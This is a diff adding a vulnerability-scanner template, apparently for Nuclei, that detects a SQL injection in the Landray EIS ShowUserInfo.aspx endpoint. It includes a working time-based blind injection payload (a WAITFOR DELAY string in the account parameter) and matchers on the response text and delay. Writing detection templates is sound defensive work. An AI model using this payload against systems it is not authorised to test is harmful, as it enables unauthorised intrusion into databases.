@@ -1,0 +1,23 @@
+id: landray-eis-showuserinfo-sqli
+info:
+  name: Landray EIS ShowUserInfo.aspx SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects a SQL injection vulnerability in the Landray EIS Intelligent Collaboration Platform's ShowUserInfo.aspx endpoint.
+http:
+  - method: GET
+    path:
+      - "/third/DingTalk/Demo/ShowUserInfo.aspx?account=1%27;WAITFOR+DELAY+%270:0:{{rand_int(5,10)}}%27--"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "蓝凌EIS体验系统用户信息"
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "duration >= 5"
+          - "duration <= 10"
